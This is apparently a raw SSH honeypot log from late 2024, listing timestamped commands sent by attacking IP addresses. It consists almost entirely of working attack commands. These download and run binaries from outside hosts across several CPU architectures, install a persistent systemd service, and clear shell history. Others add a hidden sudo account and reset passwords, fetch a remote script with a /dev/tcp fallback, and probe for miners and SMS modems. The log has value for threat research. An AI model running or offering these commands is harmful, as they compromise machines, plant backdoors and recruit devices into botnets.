start
2024-11-29 14:40:17.460267 - ('141.0.99.244', 44570) - /ip cloud print

2024-11-30 01:38:01.969256 - ('45.148.10.203', 59248) - apt
2024-11-30 01:38:03.441381 - ('45.148.10.203', 59248) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:38:11.288750 - ('45.148.10.203', 49236) - apt
2024-11-30 01:38:12.604977 - ('45.148.10.203', 49236) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:38:20.503048 - ('45.148.10.203', 42388) - apt
2024-11-30 01:38:21.432623 - ('45.148.10.203', 42388) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:38:28.683876 - ('45.148.10.203', 41084) - apt
2024-11-30 01:38:30.113416 - ('45.148.10.203', 41084) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:38:37.389118 - ('45.148.10.203', 35336) - apt
2024-11-30 01:38:38.600978 - ('45.148.10.203', 35336) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:38:46.607056 - ('45.148.10.203', 35432) - apt
2024-11-30 01:38:47.498132 - ('45.148.10.203', 35432) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:38:54.754685 - ('45.148.10.203', 45342) - apt
2024-11-30 01:38:55.954636 - ('45.148.10.203', 45342) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:39:03.781459 - ('45.148.10.203', 59528) - apt
2024-11-30 01:39:05.122500 - ('45.148.10.203', 59528) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:39:12.036054 - ('45.148.10.203', 32986) - apt
2024-11-30 01:39:13.120438 - ('45.148.10.203', 32986) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:39:21.797926 - ('45.148.10.203', 42320) - apt
2024-11-30 01:39:23.083347 - ('45.148.10.203', 42320) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:39:30.520731 - ('45.148.10.203', 47432) - apt
2024-11-30 01:39:32.084121 - ('45.148.10.203', 47432) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:39:39.330549 - ('45.148.10.203', 49972) - apt
2024-11-30 01:39:40.752709 - ('45.148.10.203', 49972) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:39:49.830360 - ('45.148.10.203', 53598) - apt
2024-11-30 01:39:51.126967 - ('45.148.10.203', 53598) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:39:58.497320 - ('45.148.10.203', 52440) - apt
2024-11-30 01:39:59.851441 - ('45.148.10.203', 52440) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:40:07.450939 - ('45.148.10.203', 55078) - apt
2024-11-30 01:40:09.511149 - ('45.148.10.203', 55078) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:40:16.571963 - ('45.148.10.203', 60442) - apt
2024-11-30 01:40:17.856565 - ('45.148.10.203', 60442) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:40:24.843769 - ('45.148.10.203', 60470) - apt
2024-11-30 01:40:25.960150 - ('45.148.10.203', 60470) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:40:33.592441 - ('45.148.10.203', 48498) - apt
2024-11-30 01:40:34.900159 - ('45.148.10.203', 48498) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:40:42.382191 - ('45.148.10.203', 35098) - apt
2024-11-30 01:40:43.808104 - ('45.148.10.203', 35098) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:40:51.286485 - ('45.148.10.203', 40622) - apt
2024-11-30 01:40:52.535796 - ('45.148.10.203', 40622) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:41:00.002972 - ('45.148.10.203', 59182) - apt
2024-11-30 01:41:01.255139 - ('45.148.10.203', 59182) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:41:08.519223 - ('45.148.10.203', 47046) - apt
2024-11-30 01:41:10.013998 - ('45.148.10.203', 47046) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:41:17.272736 - ('45.148.10.203', 45660) - apt
2024-11-30 01:41:18.467299 - ('45.148.10.203', 45660) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:41:25.352832 - ('45.148.10.203', 45704) - apt
2024-11-30 01:41:26.868931 - ('45.148.10.203', 45704) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:41:34.242089 - ('45.148.10.203', 36908) - apt
2024-11-30 01:41:35.662143 - ('45.148.10.203', 36908) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:41:43.169435 - ('45.148.10.203', 55606) - apt
2024-11-30 01:41:44.555465 - ('45.148.10.203', 55606) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:41:52.190086 - ('45.148.10.203', 44108) - apt
2024-11-30 01:41:53.403667 - ('45.148.10.203', 44108) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:42:02.068046 - ('45.148.10.203', 53482) - apt
2024-11-30 01:42:02.985577 - ('45.148.10.203', 53482) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:42:11.411637 - ('45.148.10.203', 56922) - apt
2024-11-30 01:42:12.494569 - ('45.148.10.203', 56922) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:42:20.473862 - ('45.148.10.203', 47890) - apt
2024-11-30 01:42:21.640444 - ('45.148.10.203', 47890) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:42:29.611264 - ('45.148.10.203', 59290) - apt
2024-11-30 01:42:31.239585 - ('45.148.10.203', 59290) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:42:38.815338 - ('45.148.10.203', 54100) - apt
2024-11-30 01:42:40.109300 - ('45.148.10.203', 54100) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:42:47.476915 - ('45.148.10.203', 43176) - apt
2024-11-30 01:42:48.744204 - ('45.148.10.203', 43176) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:42:56.563015 - ('45.148.10.203', 43210) - apt
2024-11-30 01:42:57.571631 - ('45.148.10.203', 43210) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:43:05.225983 - ('45.148.10.203', 49284) - apt
2024-11-30 01:43:06.442296 - ('45.148.10.203', 49284) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 01:43:13.864177 - ('45.148.10.203', 44192) - apt
2024-11-30 01:43:15.565815 - ('45.148.10.203', 44192) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-11-30 10:03:36.164464 - ('46.19.143.66', 43892) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 RZ2zAn8T) system && sudo usermod -aG sudo system
2024-11-30 10:03:36.912856 - ('46.19.143.66', 43892) - lscpu && echo -e "RZ2zAn8T\nRZ2zAn8T" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
2024-11-30 12:29:59.725301 - ('87.120.113.231', 47200) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-11-30 15:14:03.069692 - ('182.215.66.232', 45816) - /ip cloud print
2024-11-30 15:14:04.152313 - ('182.215.66.232', 45816) - ifconfig
2024-11-30 15:14:05.032321 - ('182.215.66.232', 45816) - uname -a
2024-11-30 15:14:05.912840 - ('182.215.66.232', 45816) - cat /proc/cpuinfo
2024-11-30 15:14:06.792596 - ('182.215.66.232', 45816) - ps | grep '[Mm]iner'
2024-11-30 15:14:07.672672 - ('182.215.66.232', 45816) - ps -ef | grep '[Mm]iner'
2024-11-30 15:14:08.566826 - ('182.215.66.232', 45816) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-11-30 15:14:09.452471 - ('182.215.66.232', 45816) - echo Hi | cat -n
2024-11-30 17:17:49.311720 - ('46.19.143.66', 33894) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 dEwHR47A) system && sudo usermod -aG sudo system
2024-11-30 17:17:50.052310 - ('46.19.143.66', 33894) - lscpu && echo -e "dEwHR47A\ndEwHR47A" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
2024-11-30 17:51:47.818596 - ('152.171.120.153', 49410) - /ip cloud print
2024-11-30 17:51:50.240316 - ('152.171.120.153', 49410) - ifconfig
2024-11-30 17:51:52.110695 - ('152.171.120.153', 49410) - uname -a
2024-11-30 17:51:53.984845 - ('152.171.120.153', 49410) - cat /proc/cpuinfo
2024-11-30 17:51:55.951627 - ('152.171.120.153', 49410) - ps | grep '[Mm]iner'
2024-11-30 17:51:57.797681 - ('152.171.120.153', 49410) - ps -ef | grep '[Mm]iner'
2024-11-30 17:51:59.638891 - ('152.171.120.153', 49410) - ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect_socket /etc/config/simman /dev/modem* /var/config/sms/*
2024-11-30 17:52:01.485126 - ('152.171.120.153', 49410) - echo Hi | cat -n
2024-11-30 19:07:47.887110 - ('46.19.143.66', 48830) - apt update && apt install sudo curl -y && sudo useradd -m -p $(openssl passwd -1 hq8PEXVR) system && sudo usermod -aG sudo system
2024-11-30 19:07:48.437419 - ('46.19.143.66', 48830) - lscpu && echo -e "hq8PEXVR\nhq8PEXVR" | passwd && curl https://ipinfo.io/org --insecure -s && free -h && apt
2024-11-30 19:08:09.912228 - ('91.223.28.50', 30822) - uname -a
2024-11-30 22:40:27.263084 - ('87.120.113.231', 36320) - uname -a; echo -e "\x61\x75\x74\x68\x5F\x6F\x6B\x0A"; SC=$(wget -O- http://94.156.177.109/sh || curl http://94.156.177.109/sh); if [ $? -ne 0 ]; then exec 3<>"/dev/tcp/94.156.177.109/80"; echo -e "GET /sh HTTP/1.0\r\nHost: 94.156.177.109\r\n\r\n" >&3; (while read -r line; do [ "$line" = $'\r' ] && break; done && cat) <&3 | sh -s ssh; exec 3>&-; else echo "$SC" | sh -s ssh; fi

2024-12-01 06:54:09.484806 - ('154.213.187.182', 33964) - cd /tmp || cd /var/run || cd /mnt || cd /root; rm -rf mips; wget http://154.216.19.215/mips; chmod +x mips; ./mips ssh.mips; cd /tmp || cd /var/run || cd /mnt || cd /root; rm -rf mpsl; wget http://154.216.19.215/mpsl; chmod +x mpsl; ./mpsl ssh.mpsl; cd /tmp || cd /var/run || cd /mnt || cd /root; rm -rf arm; wget http://154.216.19.215/arm; chmod +x arm; ./arm ssh.arm; cd /tmp || cd /var/run || cd /mnt || cd /root; rm -rf arm5; wget http://154.216.19.215/arm5; chmod +x arm5; ./arm5 ssh.arm5; cd /tmp || cd /var/run || cd /mnt || cd /root; rm -rf arm7; wget http://154.216.19.215/arm7; chmod +x arm7; ./arm7 ssh.arm7; cd /tmp || cd /var/run || cd /mnt || cd /root; rm -rf x86; wget http://154.216.19.215/x86; chmod +x x86; ./x86 ssh.x86
2024-12-01 07:05:54.577397 - ('45.148.10.203', 34244) - apt
2024-12-01 07:05:55.810415 - ('45.148.10.203', 34244) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 07:06:03.229908 - ('45.148.10.203', 39990) - apt
2024-12-01 07:06:04.484664 - ('45.148.10.203', 39990) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 07:06:11.781359 - ('45.148.10.203', 36492) - apt
2024-12-01 07:06:13.117511 - ('45.148.10.203', 36492) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 07:06:20.307760 - ('45.148.10.203', 38938) - apt
2024-12-01 07:06:21.448158 - ('45.148.10.203', 38938) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 07:06:28.617400 - ('45.148.10.203', 43250) - apt
2024-12-01 07:06:29.915588 - ('45.148.10.203', 43250) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 07:06:37.306640 - ('45.148.10.203', 43300) - apt
2024-12-01 07:06:38.519647 - ('45.148.10.203', 43300) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 07:06:45.672981 - ('45.148.10.203', 54452) - apt
2024-12-01 07:06:46.843060 - ('45.148.10.203', 54452) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 07:06:54.102025 - ('45.148.10.203', 57952) - apt
2024-12-01 07:06:55.432193 - ('45.148.10.203', 57952) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 07:07:02.579757 - ('45.148.10.203', 58084) - apt
2024-12-01 07:07:03.746176 - ('45.148.10.203', 58084) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 07:07:11.062790 - ('45.148.10.203', 51830) - apt
2024-12-01 07:07:12.289894 - ('45.148.10.203', 51830) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 07:07:19.348610 - ('45.148.10.203', 37168) - apt
2024-12-01 07:07:20.573138 - ('45.148.10.203', 37168) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 07:07:27.703881 - ('45.148.10.203', 37178) - apt
2024-12-01 07:07:28.872239 - ('45.148.10.203', 37178) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 07:07:36.145029 - ('45.148.10.203', 46742) - apt
2024-12-01 07:07:37.358789 - ('45.148.10.203', 46742) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 07:07:44.474327 - ('45.148.10.203', 49062) - apt
2024-12-01 07:07:45.634108 - ('45.148.10.203', 49062) - apt -y install curl && rm -rf /etc/de && pkill cARM ; mkdir /etc/de && curl -k -o /etc/de/cARM http://51.81.121.129/cARM && curl -k -o /etc/systemd/system/sshell.service http://51.81.121.129/sshell.service && chmod 777 /etc/de/cARM ; systemctl daemon-reload && systemctl enable sshell.service && systemctl start sshell.service && history -c

2024-12-01 07:07:52.726449 - ('45.148.10.203', 33392) - apt
